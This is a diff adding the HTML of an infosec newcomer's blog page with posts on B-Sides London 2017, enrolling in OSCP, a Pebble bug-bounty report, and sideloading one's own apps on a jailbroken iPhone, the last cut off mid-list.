@@ -1,0 +1,923 @@
+<!DOCTYPE html>
+<!--[if IE 6]>
+<html id="ie6" lang="en-US">
+<![endif]--><!--[if IE 7]>
+<html id="ie7" lang="en-US">
+<![endif]--><!--[if IE 8]>
+<html id="ie8" lang="en-US">
+<![endif]--><!--[if !(IE 6) & !(IE 7) & !(IE 8)]><!--><html lang="en-US">
+<!--<![endif]-->
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<title>
+Graeme Robinson&#039;s blog | A place for my thoughts when I was starting to break into the information security feild | Page 2	</title>
+<link rel="profile" href="https://gmpg.org/xfn/11">
+<link rel="stylesheet" type="text/css" media="all" href="/wp-content/themes/twentyelevenmod/style.css?ver=20240716">
+<link rel="pingback" href="/xmlrpc.php">
+<!--[if lt IE 9]>
+<script src="/wp-content/themes/twentyeleven/js/html5.js?ver=3.7.0" type="text/javascript"></script>
+<![endif]-->
+<meta name="robots" content="max-image-preview:large">
+<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; Feed" href="/feed/">
+<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; Comments Feed" href="/comments/feed/">
+<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"🏳️‍⚧️","🏳️​⚧️")?!1:!n(e,"🇺🇳","🇺​🇳")&&!n(e,"🏴󠁧󠁢󠁥󠁮󠁧󠁿","🏴​󠁧​󠁢​󠁥​󠁮​󠁧​󠁿");case"emoji":return!n(e,"🐦‍⬛","🐦​⬛")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<style id="wp-emoji-styles-inline-css" type="text/css">img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}</style>
+<link rel="stylesheet" id="wp-block-library-css" href="/wp-includes/css/dist/block-library/style.min.css?ver=6.6.2" type="text/css" media="all">
+<style id="wp-block-library-theme-inline-css" type="text/css">.wp-block-audio :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio :where(figcaption){color:#ffffffa6}.wp-block-audio{margin:0 0 1em}.wp-block-code{border:1px solid #ccc;border-radius:4px;font-family:Menlo,Consolas,monaco,monospace;padding:.8em 1em}.wp-block-embed :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed :where(figcaption){color:#ffffffa6}.wp-block-embed{margin:0 0 1em}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme .blocks-gallery-caption{color:#ffffffa6}:root :where(.wp-block-image figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme :root :where(.wp-block-image figcaption){color:#ffffffa6}.wp-block-image{margin:0 0 1em}.wp-block-pullquote{border-bottom:4px solid;border-top:4px solid;color:currentColor;margin-bottom:1.75em}.wp-block-pullquote cite,.wp-block-pullquote footer,.wp-block-pullquote__citation{color:currentColor;font-size:.8125em;font-style:normal;text-transform:uppercase}.wp-block-quote{border-left:.25em solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote footer{color:currentColor;font-size:.8125em;font-style:normal;position:relative}.wp-block-quote.has-text-align-right{border-left:none;border-right:.25em solid;padding-left:0;padding-right:1em}.wp-block-quote.has-text-align-center{border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large,.wp-block-quote.is-style-plain{border:none}.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-search__button{border:1px solid #ccc;padding:.375em .625em}:where(.wp-block-group.has-background){padding:1.25em 2.375em}.wp-block-separator.has-css-opacity{opacity:.4}.wp-block-separator{border:none;border-bottom:2px solid;margin-left:auto;margin-right:auto}.wp-block-separator.has-alpha-channel-opacity{opacity:1}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table{margin:0 0 1em}.wp-block-table td,.wp-block-table th{word-break:normal}.wp-block-table :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table :where(figcaption){color:#ffffffa6}.wp-block-video :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video :where(figcaption){color:#ffffffa6}.wp-block-video{margin:0 0 1em}:root :where(.wp-block-template-part.has-background){margin-bottom:0;margin-top:0;padding:1.25em 2.375em}</style>
+<style id="classic-theme-styles-inline-css" type="text/css">/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}</style>
+<style id="global-styles-inline-css" type="text/css">:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #fff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--blue: #1982d1;--wp--preset--color--dark-gray: #373737;--wp--preset--color--medium-gray: #666;--wp--preset--color--light-gray: #e2e2e2;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}</style>
+<link rel="stylesheet" id="wp-syntax-css-css" href="/wp-content/plugins/wp-syntax/css/wp-syntax.css?ver=1.2" type="text/css" media="all">
+<link rel="stylesheet" id="twentyeleven-block-style-css" href="/wp-content/themes/twentyeleven/blocks.css?ver=20240621" type="text/css" media="all">
+<script type="text/javascript" src="/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type="text/javascript" src="/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<link rel="https://api.w.org/" href="/wp-json/">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="/xmlrpc.php?rsd">
+<meta name="generator" content="WordPress 6.6.2">
+	<style>/* Link color */
+		a,
+		#site-title a:focus,
+		#site-title a:hover,
+		#site-title a:active,
+		.entry-title a:hover,
+		.entry-title a:focus,
+		.entry-title a:active,
+		.widget_twentyeleven_ephemera .comments-link a:hover,
+		section.recent-posts .other-recent-posts a[rel="bookmark"]:hover,
+		section.recent-posts .other-recent-posts .comments-link a:hover,
+		.format-image footer.entry-meta a:hover,
+		#site-generator a:hover {
+			color: #ff7600;
+		}
+		section.recent-posts .other-recent-posts .comments-link a:hover {
+			border-color: #ff7600;
+		}
+		article.feature-image.small .entry-summary p a:hover,
+		.entry-header .comments-link a:hover,
+		.entry-header .comments-link a:focus,
+		.entry-header .comments-link a:active,
+		.feature-slider a.active {
+			background-color: #ff7600;
+		}</style>
+	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+<style type="text/css" id="custom-background-css">body.custom-background { background-color: #f1f1f1; }</style>
+	</head>
+
+<body class="home blog paged custom-background wp-embed-responsive paged-2 single-author two-column right-sidebar">
+<div class="skip-link"><a class="assistive-text" href="#content">Skip to primary content</a></div>
+<div class="skip-link"><a class="assistive-text" href="#secondary">Skip to secondary content</a></div>
+<div id="page" class="hfeed">
+	<header id="branding">
+			<hgroup>
+				<h1 id="site-title"><span><a href="/" rel="home">Graeme Robinson&#039;s blog</a></span></h1>
+				<h2 id="site-description">A place for my thoughts when I was starting to break into the information security feild</h2>
+			</hgroup>
+
+						<a href="/">
+				<img src="/wp-content/uploads/2012/09/copy-Bruv-Beans-Banner.jpg" width="1000" height="228" alt="Graeme Robinson&#039;s blog" srcset="/wp-content/uploads/2012/09/copy-Bruv-Beans-Banner.jpg 1000w, /wp-content/uploads/2012/09/copy-Bruv-Beans-Banner-300x68.jpg 300w, /wp-content/uploads/2012/09/copy-Bruv-Beans-Banner-500x114.jpg 500w" sizes="(max-width: 1000px) 100vw, 1000px" decoding="async" fetchpriority="high">			</a>
+			
+									<form method="get" id="searchform" action="/">
+		<label for="s" class="assistive-text">Search</label>
+		<input type="text" class="field" name="s" id="s" placeholder="Search">
+		<input type="submit" class="submit" name="submit" id="searchsubmit" value="Search">
+	</form>
+			
+			<nav id="access">
+				<h3 class="assistive-text">Main menu</h3>
+				<div class="menu"><ul>
+<li><a href="/">Home</a></li>
+<li class="page_item page-item-2"><a href="/about-me/">About Me</a></li>
+<li class="page_item page-item-13"><a href="/infosec-links/">InfoSec Links</a></li>
+</ul></div>
+			</nav><!-- #access -->
+	</header><!-- #branding -->
+
+
+	<div id="main">
+
+		<div id="primary">
+			<div id="content" role="main">
+
+			
+							<nav id="nav-above">
+				<h3 class="assistive-text">Post navigation</h3>
+				<div class="nav-previous"><a href="/page/3/"><span class="meta-nav">&larr;</span> Older posts</a></div>
+				<div class="nav-next"><a href="/">Newer posts <span class="meta-nav">&rarr;</span></a></div>
+			</nav><!-- #nav-above -->
+			
+				
+					
+	<article id="post-282" class="post-282 post type-post status-publish format-standard hentry category-conference category-infosec">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/b-sides-london-2017/" rel="bookmark">B-Sides London 2017</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/b-sides-london-2017/" title="3:26 PM" rel="bookmark"><time class="entry-date" datetime="2017-06-10T15:26:12+00:00">2017-06-10</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/b-sides-london-2017/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>I took a day off from work on Wednesday last week to go to <a href="https://www.securitybsides.org.uk/">B-Sides London</a>, and had probably the best day this year! There were so many interesting talks and loads of great people to chat to (and potential job opportunities). I even won a wristband which game me access to the <a href="https://www.mwrinfosecurity.com/">MWR</a> sponsored afterparty with free drinks 🙂</p>
+<p>The most entertaining talk by far was by <a href="https://twitter.com/info_dox">@info_dox</a> titled &#8220;A look at TR-06FAIL and other CPE Configuration Disasters&#8221;. Darren showed up with a pint in his hand and proceeded to tell us all about the problems with the <a href="https://www.broadband-forum.org/">Broadband Forum</a>&#8216;s protocols and their various implementations.</p>
+<p>I came away with a bit of swag too, 3 T-Shirts, and a signed copy of &#8220;Breaking Into Information Security by <a href="https://twitter.com/zephrfish">Andy Gill</a> (which reminds me, I must get in contact with him for the digital copy he promised me).</p>
+<p>I&#8217;d like to say a big thank you to all the volunteers who made it such a great event. Hopefully in the future, I&#8217;ll be able to give something back by helping out at one of these events, or something similar.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/infosec/conference/" rel="category tag">Conference</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/b-sides-london-2017/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-282 -->
+
+				
+					
+	<article id="post-285" class="post-285 post type-post status-publish format-standard hentry category-education category-infosec category-kali category-online-course category-oscp category-pentest category-pwk">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/ive-signed-up-to-the-penetration-testing-with-kali-linux-course-oscp/" rel="bookmark">I&#8217;ve signed up to the Penetration testing with Kali Linux Course (OSCP)</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/ive-signed-up-to-the-penetration-testing-with-kali-linux-course-oscp/" title="9:45 PM" rel="bookmark"><time class="entry-date" datetime="2017-06-06T21:45:59+00:00">2017-06-06</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/ive-signed-up-to-the-penetration-testing-with-kali-linux-course-oscp/#comments">3</a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>Last week I signed up for the <a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/">PWK course from Offensive Security</a> starting in mid June with the intentions of getting the OSCP certification. I booked 60 days of lab access; I hope that&#8217;s enough, but if I don&#8217;t manage to find enough free time in those 60 days, I should be able to book some time off work towards the end. Failing that, I can always buy more time in the labs if I really need it.</p>
+<p>I&#8217;m interested to see how I&#8217;ll handle the 24 hour exam at the end. Sounds like a fun challenge, which I suppose if what the whole point is (as well as proving skills).</p>
+<p>In the weeks before that course starts, I&#8217;m working my way through the <a href="https://www.offensive-security.com/metasploit-unleashed/">Metasploit Unleashed</a> course, also by Offensive Security. Looks like a great tool, from what I&#8217;ve learned about it so far.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/education/" rel="category tag">Education</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/kali/" rel="category tag">Kali</a>, <a href="/category/education/online-course/" rel="category tag">Online Course</a>, <a href="/category/education/online-course/oscp/" rel="category tag">OSCP</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/pwk/" rel="category tag">PWK</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/ive-signed-up-to-the-penetration-testing-with-kali-linux-course-oscp/#comments"><b>3</b> Replies</a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-285 -->
+
+				
+					
+	<article id="post-278" class="post-278 post type-post status-publish format-standard hentry category-exploit category-infosec category-white-hat">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/am-i-officially-a-white-hat-hacker-now/" rel="bookmark">Am I officially a white hat hacker now!?</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/am-i-officially-a-white-hat-hacker-now/" title="2:31 PM" rel="bookmark"><time class="entry-date" datetime="2016-08-16T14:31:43+00:00">2016-08-16</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/am-i-officially-a-white-hat-hacker-now/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>A while ago, while developing a geocaching app for pebble smartwatches called <a href="https://apps.getpebble.com/applications/571f2701bfdfeab1cf000004">&#8220;Watch Caching&#8221;</a>, I noticed a bug that could have security implications, so I reported it to Pebble using <a href="https://www.pebble.com/legal/white_hat/">the whitehat guidelines set out by theme</a></p>
+<p>It took them a while, but they eventually got back to me and agreed that it was a security vulnerability and wanted to offer me a significant financial reward, as well as put me in the <a href="https://www.pebble.com/legal/white_hat/hall_of_fame">Pebble White Hat Hall of Fame</a></p>
+<p>This also took a while to come to fruition, but they did hold true to their word and sent me the money, followed a few days later by my name being added to the <a href="https://www.pebble.com/legal/white_hat/hall_of_fame">Pebble White Hat Hall of Fame</a>!</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/exploit/" rel="category tag">Exploit</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/infosec/white-hat/" rel="category tag">White Hat</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/am-i-officially-a-white-hat-hacker-now/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-278 -->
+
+				
+					
+	<article id="post-260" class="post-260 post type-post status-publish format-standard hentry category-appsync category-development category-ios category-jailbreak category-xcode">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/developing-and-debugging-my-own-apps-on-jailbroken-ios8-1-using-xcode-6-1-without-paying-apple/" rel="bookmark">Developing and debugging my own apps on JailBroken iOS8.1 using XCode 6.1 without paying apple</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/developing-and-debugging-my-own-apps-on-jailbroken-ios8-1-using-xcode-6-1-without-paying-apple/" title="10:54 AM" rel="bookmark"><time class="entry-date" datetime="2014-11-16T10:54:28+00:00">2014-11-16</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/developing-and-debugging-my-own-apps-on-jailbroken-ios8-1-using-xcode-6-1-without-paying-apple/#comments">64</a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>A while back I used an app called JailCoder to enable me to run and debug my own apps on my jailbroken iPhone 5S without having to pay Apple for a full developer account. I&#8217;m still learning iOS development and I have nothing I want to submit to the app store, so I&#8217;m reluctant to pay the £100 that Apple wants to enable me to run my own code on my own device.</p>
+<p>Given that XCode is free, and that £100 per year would gives me the ability to sell apps through the app store, I think it&#8217;s a bargain if you are actually planning to distribute apps, but for me just learning it seems a bit steep.</p>
+<p>There don&#8217;t seem to be many tutorials out there telling you how to do this for iOS8.1 and XCode 6.1 (they are all a bit outdated), but this is what worked for me:</p>
+<ol>
+<li>On your Jailbroken device install AppSync Unified 5.2-1 (or later) from AngelXWind&#8217;s repo. Don&#8217;t use any other AppSync, and if you have others, be sure to remove them.</li>
+<li>Open /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk/SDKSettings.plist and change AD_HOC_CODE_SIGNING_ALLOWED to YES. You may need to duplicate it to the desktop, change it, save it, then drag and drop back into the original folder because OS X let you edit the file in place.</li>
+<li>If XCode was running, restart XCode.</li>
+<li>Change your Project and Target settings to &#8220;Ad Hoc Code Sign&#8221; in Build Settings</li>
+<li>Tell XCode to run app on iPhone. At this point XCode will put app on your iDevice, but can’t debug because it can&#8217;t attach to the process. The app will start then close immediately. You can now manually start the app on the phone now though.</li>
